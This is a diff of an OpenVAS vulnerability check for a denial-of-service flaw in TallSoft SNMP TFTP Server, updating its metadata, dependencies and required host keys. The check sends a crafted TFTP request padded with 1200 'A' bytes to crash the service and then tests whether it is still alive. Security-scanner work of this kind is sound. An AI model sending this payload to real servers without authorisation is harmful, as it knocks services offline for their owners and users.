@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_tallsoft_snmp_tftp_server_dos_vuln.nasl 12465 2018-11-21 13:24:34Z cfischer $
+# $Id: gb_tallsoft_snmp_tftp_server_dos_vuln.nasl 13203 2019-01-21 15:28:12Z cfischer $
 #
 # TallSoft SNMP TFTP Server Denial Of Service Vulnerability
 #
@@ -27,17 +27,19 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.806694");
-  script_version("$Revision: 12465 $");
+  script_version("$Revision: 13203 $");
   script_tag(name:"cvss_base", value:"5.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
-  script_tag(name:"last_modification", value:"$Date: 2018-11-21 14:24:34 +0100 (Wed, 21 Nov 2018) $");
+  script_tag(name:"last_modification", value:"$Date: 2019-01-21 16:28:12 +0100 (Mon, 21 Jan 2019) $");
   script_tag(name:"creation_date", value:"2016-04-01 13:19:27 +0530 (Fri, 01 Apr 2016)");
   script_name("TallSoft SNMP TFTP Server Denial Of Service Vulnerability");
   script_category(ACT_DENIAL);
   script_copyright("Copyright (C) 2016 Greenbone Networks GmbH");
   script_family("Denial of Service");
-  script_dependencies("tftpd_detect.nasl");
+  script_dependencies("tftpd_detect.nasl", "global_settings.nasl", "os_detection.nasl");
   script_require_udp_ports("Services/udp/tftp", 69);
+  script_require_keys("tftp/detected", "Host/runs_windows");
+  script_exclude_keys("keys/TARGET_IS_IPV6");
 
   script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/39627");
 
@@ -68,18 +70,18 @@ if(description)
 include("tftp.inc");
 
 serPort = get_kb_item("Services/udp/tftp");
-if(!serPort){
+if(!serPort)
   serPort = 69;
-}
 
-if(!tftp_alive(port:serPort)){
+if(!get_udp_port_state(serPort))
   exit(0);
-}
+
+if(!tftp_alive(port:serPort))
+  exit(0);
 
 soc = open_sock_udp(serPort);
-if(!soc){
+if(!soc)
   exit(0);
-}
 
 attack = raw_string(0x00, 0x01, 0x00) + raw_string(crap(data:raw_string(0x41),
                     length: 1200)) + raw_string(0x00);
@@ -87,8 +89,8 @@ send(socket:soc, data:attack);
 
 close(soc);
 
-if(!tftp_alive(port:serPort)){
-  security_message(port:serPort);
+if(!tftp_alive(port:serPort)) {
+  security_message(port:serPort, proto:"udp");
   exit(0);
 }
 
